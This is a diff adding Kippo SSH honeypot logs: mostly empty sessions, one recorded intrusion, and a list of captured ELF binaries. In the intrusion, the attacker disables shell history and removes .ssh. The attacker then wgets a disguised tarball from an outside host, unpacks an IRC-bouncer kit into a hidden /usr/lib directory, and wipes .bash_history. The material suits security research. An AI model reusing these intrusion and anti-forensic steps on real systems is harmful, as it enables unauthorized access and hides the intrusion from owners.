@@ -1,0 +1,365 @@
+***Sessions***
+
+
+---START:/opt/kippo/log/tty---
+Couldn't open log file!
+
+---END:/opt/kippo/log/tty---
+
+
+---START:/opt/kippo/log/tty/20150307-143659-2895.log---
+www-data@devops05:/$
+---END:/opt/kippo/log/tty/20150307-143659-2895.log---
+
+
+---START:/opt/kippo/log/tty/20150302-033247-2804.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150302-033247-2804.log---
+
+
+---START:/opt/kippo/log/tty/20150312-114154-5292.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150312-114154-5292.log---
+
+
+---START:/opt/kippo/log/tty/20150302-013609-1414.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150302-013609-1414.log---
+
+
+---START:/opt/kippo/log/tty/20150322-112810-8826.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150322-112810-8826.log---
+
+
+---START:/opt/kippo/log/tty/20150306-104215-9978.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150306-104215-9978.log---
+
+
+---START:/opt/kippo/log/tty/20150307-153324-979.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150307-153324-979.log---
+
+
+---START:/opt/kippo/log/tty/20150311-230049-5957.log---
+www-data@devops05:/$
+---END:/opt/kippo/log/tty/20150311-230049-5957.log---
+
+
+---START:/opt/kippo/log/tty/20150307-121652-6995.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150307-121652-6995.log---
+
+
+---START:/opt/kippo/log/tty/20150312-115439-464.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150312-115439-464.log---
+
+
+---START:/opt/kippo/log/tty/20150310-070346-6799.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150310-070346-6799.log---
+
+
+---START:/opt/kippo/log/tty/20150312-171943-8723.log---
+root@devops05:~# unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
+root@devops05:~# export HISTFILE=/dev/null
+root@devops05:~# export HISTSIZE=0
+root@devops05:~# w
+ 17:20:13 up 11 days,  1:28,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/0    188.26.74.163     17:19    0.00s  0.00s  0.00s w
+root@devops05:~# uname -a
+Linux devops05 2.6.26-2-686 #1 SMP Wed Nov 4 20:45:37 UTC 2009 i686 GNU/Linux
+root@devops05:~# ls -a
+.         ..        .profile  .ssh      .aptitude .bashrc
+root@devops05:~# rm -rf .ssh
+root@devops05:~# cd /tmp
+root@devops05:/tmp# ls -a
+.         ..        .X11-unix .ICE-unix
+root@devops05:/tmp# cd /var/tmp
+root@devops05:/var/tmp# ls -a
+.  ..
+root@devops05:/var/tmp# cd
+root@devops05:~# ps x
+ PID TTY      STAT    TIME COMMAND
+   1 ?        Ss      0:07 init [2]
+   2 ?        S<      0:00 [kthreadd]
+   3 ?        S<      0:00 [migration/0]
+   4 ?        S<      0:00 [ksoftirqd/0]
+   5 ?        S<      0:00 [watchdog/0]
+   6 ?        S<      0:17 [events/0]
+   7 ?        S<      0:00 [khelper]
+  39 ?        S<      0:00 [kblockd/0]
+  41 ?        S<      0:00 [kacpid]
+  42 ?        S<      0:00 [kacpi_notify]
+ 170 ?        S<      0:00 [kseriod]
+ 207 ?        S       0:01 [pdflush]
+ 208 ?        S       0:00 [pdflush]
+ 209 ?        S<      0:00 [kswapd0]
+ 210 ?        S<      0:00 [aio/0]
+ 748 ?        S<      0:00 [ata/0]
+ 749 ?        S<      0:00 [ata_aux]
+ 929 ?        S<      0:00 [scsi_eh_0]
+1014 ?        D<      0:03 [kjournald]
+1087 ?        S<s     0:00 udevd --daemon
+1553 ?        S<      0:00 [kpsmoused]
+2054 ?        Sl      0:01 /usr/sbin/rsyslogd -c3
+2103 tty1     Ss      0:00 /bin/login --
+2105 tty2     Ss+     0:00 /sbin/getty 38400 tty2
+2107 tty3     Ss+     0:00 /sbin/getty 38400 tty3
+2109 tty4     Ss+     0:00 /sbin/getty 38400 tty4
+2110 tty5     Ss+     0:00 /sbin/getty 38400 tty5
+2112 tty6     Ss+     0:00 /sbin/getty 38400 tty6
+2133 ?        S<s     0:00 dhclient3 -pf /var/run/dhclient.eth0.pid -lf /var/lib
+4969 ?        Ss      0:00 /usr/sbin/sshd: root@pts/0
+5673 pts/0    Ss      0:00 -bash
+5679 pts/0    R+      0:00 ps x
+root@devops05:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+root@devops05:~# cd /usr/lib
+root@devops05:/usr/lib# wget http://safe.home.ro/muhs.jpg
+--2015-03-12 17:21:08--  http://safe.home.ro/muhs.jpg
+Connecting to safe.home.ro:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 225610 (220K) [image/jpeg]
+Saving to: `muhs.jpg
+
+100%[======================================>] 225,610      41K/s  eta 1s
+
+2015-03-12 17:21:12 (41 KB/s) - `muhs.jpg' saved [225610/225610]
+root@devops05:/usr/lib# tar zxvf muhs.jpg
+.profiles
+.profiles/h
+.profiles/log
+.profiles/.muh
+.profiles/pid
+.profiles/y
+.profiles/run2
+.profiles/h.c
+.profiles/servers
+.profiles/ips
+.profiles/config
+.profiles/dir
+.profiles/inst
+.profiles/run
+.profiles/.ss
+.profiles/.servers
+.profiles/f
+.profiles/restart
+.profiles/init
+.profiles/muhrc
+.profiles/2
+.profiles/.clean
+.profiles/mess
+.profiles/cron.d
+.profiles/muhsafe.jpg
+.profiles/2/muhrc
+.profiles/.muh/VERSION
+.profiles/.muh/configure.ac
+.profiles/.muh/config.h
+.profiles/.muh/config.h.in
+.profiles/.muh/Makefile.am
+.profiles/.muh/config.status
+.profiles/.muh/configure
+.profiles/.muh/misc
+.profiles/.muh/doc
+.profiles/.muh/NEWS
+.profiles/.muh/TODO
+.profiles/.muh/config.log
+.profiles/.muh/Makefile.in
+.profiles/.muh/ChangeLog
+.profiles/.muh/aclocal.m4
+.profiles/.muh/mkinstalldirs
+.profiles/.muh/stamp-h
+.profiles/.muh/Makefile
+.profiles/.muh/run
+.profiles/.muh/INSTALL
+.profiles/.muh/stamp-h.in
+.profiles/.muh/README
+.profiles/.muh/src
+.profiles/.muh/muh.spec.in
+.profiles/.muh/COPYING
+.profiles/.muh/AUTHORS
+.profiles/.muh/missing
+.profiles/.muh/muh.spec
+.profiles/.muh/install-sh
+.profiles/.muh/conf
+.profiles/.muh/src/table.c
+.profiles/.muh/src/muh.h
+.profiles/.muh/src/commands.h
+.profiles/.muh/src/common.c
+.profiles/.muh/src/muh.c
+.profiles/.muh/src/Makefile.am
+.profiles/.muh/src/dlink.h
+.profiles/.muh/src/dlink.c
+.profiles/.muh/src/commands.c
+.profiles/.muh/src/match.h
+.profiles/.muh/src/messages.h
+.profiles/.muh/src/common.h
+.profiles/.muh/src/perm.h
+.profiles/.muh/src/log.c
+.profiles/.muh/src/Makefile.in
+.profiles/.muh/src/log.h
+.profiles/.muh/src/dcc.h
+.profiles/.muh/src/Makefile
+.profiles/.muh/src/match.c
+.profiles/.muh/src/lexer.c
+.profiles/.muh/src/parser.c
+.profiles/.muh/src/channels.h
+.profiles/.muh/src/ignore.c
+.profiles/.muh/src/ignore.h
+.profiles/.muh/src/parser.y
+.profiles/.muh/src/irc.h
+.profiles/.muh/src/irc.c
+.profiles/.muh/src/table.h
+.profiles/.muh/src/lexer.l
+.profiles/.muh/src/dcc.c
+.profiles/.muh/src/parser.h
+.profiles/.muh/src/tools.c
+.profiles/.muh/src/tools.h
+.profiles/.muh/src/ascii.h
+.profiles/.muh/src/perm.c
+.profiles/.muh/src/ascii.c
+.profiles/.muh/src/channels.c
+.profiles/.muh/doc/mdate-sh
+.profiles/.muh/doc/muh.info
+.profiles/.muh/doc/Makefile.am
+.profiles/.muh/doc/Makefile.in
+.profiles/.muh/doc/version.texi
+.profiles/.muh/doc/Makefile
+.profiles/.muh/doc/stamp-vti
+.profiles/.muh/doc/muh.texinfo
+.profiles/.muh/misc/muh-check
+.profiles/.muh/misc/Makefile.am
+.profiles/.muh/misc/muhrc.in
+.profiles/.muh/misc/Makefile.in
+.profiles/.muh/misc/muh-rotatelog
+.profiles/.muh/misc/Makefile
+.profiles/.muh/misc/muhrc
+root@devops05:/usr/lib# rm -rf muhs.jpg
+root@devops05:/usr/lib# cd .profiles
+root@devops05:/usr/lib/.profiles# chmod +x *
+root@devops05:/usr/lib/.profiles# ./inst
+Shall we play a game? cd
+A strange game. The only winning move is not to play.  How about a nice game of                       chess?
+root@devops05:/usr/lib/.profiles# cd
+root@devops05:~# cd /usr/lib
+root@devops05:/usr/lib# rm .rf .profiles
+rm: cannot remove `.profiles': Is a directory
+root@devops05:/usr/lib# cd
+root@devops05:~# rm -rf .bash_history
+root@devops05:~# touch .bash_history
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150312-171943-8723.log---
+
+
+---START:/opt/kippo/log/tty/20150315-050132-3627.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150315-050132-3627.log---
+
+
+---START:/opt/kippo/log/tty/20150303-103012-1813.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150303-103012-1813.log---
+
+
+---START:/opt/kippo/log/tty/20150319-174725-5402.log---
+www-data@devops05:/$
+---END:/opt/kippo/log/tty/20150319-174725-5402.log---
+
+
+---START:/opt/kippo/log/tty/20150319-195321-5864.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150319-195321-5864.log---
+
+
+---START:/opt/kippo/log/tty/20150314-223241-4437.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150314-223241-4437.log---
+
+
+---START:/opt/kippo/log/tty/20150310-175759-9539.log---
+www-data@devops05:/$
+---END:/opt/kippo/log/tty/20150310-175759-9539.log---
+
+
+---START:/opt/kippo/log/tty/20150305-101009-7065.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150305-101009-7065.log---
+
+
+---START:/opt/kippo/log/tty/20150309-015925-3603.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150309-015925-3603.log---
+
+
+---START:/opt/kippo/log/tty/.gitignore---
+
+---END:/opt/kippo/log/tty/.gitignore---
+
+
+---START:/opt/kippo/log/tty/20150315-044319-8271.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150315-044319-8271.log---
+
+
+---START:/opt/kippo/log/tty/20150316-131944-6810.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150316-131944-6810.log---
+
+
+---START:/opt/kippo/log/tty/20150310-162009-2126.log---
+www@devops05:/$
+---END:/opt/kippo/log/tty/20150310-162009-2126.log---
+
+
+---START:/opt/kippo/log/tty/20150311-110043-2987.log---
+root@devops05:~#
+---END:/opt/kippo/log/tty/20150311-110043-2987.log---
+
+
+***DOWNLOADS***
+
+
+/opt/kippo/dl/: directory
+/opt/kippo/dl/20150309120449__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150322120444__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150319120435__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150312172108_http___safe_home_ro_muhs_jpg: gzip compressed data,                       from Unix, last modified: Mon Nov  4 06:09:55 2013
+/opt/kippo/dl/20150317031558__root_disk: ELF 32-bit LSB executable, Intel 80386,                       version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, stripped
+/opt/kippo/dl/20150321120643__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150321114746__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150320113922__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150306102642__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150319115144__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150318120843__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150316115552__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150315115831__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150320121834__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150304101034__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/.gitignore: ASCII text
+/opt/kippo/dl/20150312120604__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150311121600__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150321175615__root_disk: ELF 32-bit LSB executable, Intel 80386,                       version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, stripped
+/opt/kippo/dl/20150304103031__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150314120409__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150318121125__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
+/opt/kippo/dl/20150308121621__fuck: ELF 32-bit LSB executable, Intel 80386, vers                      ion 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped
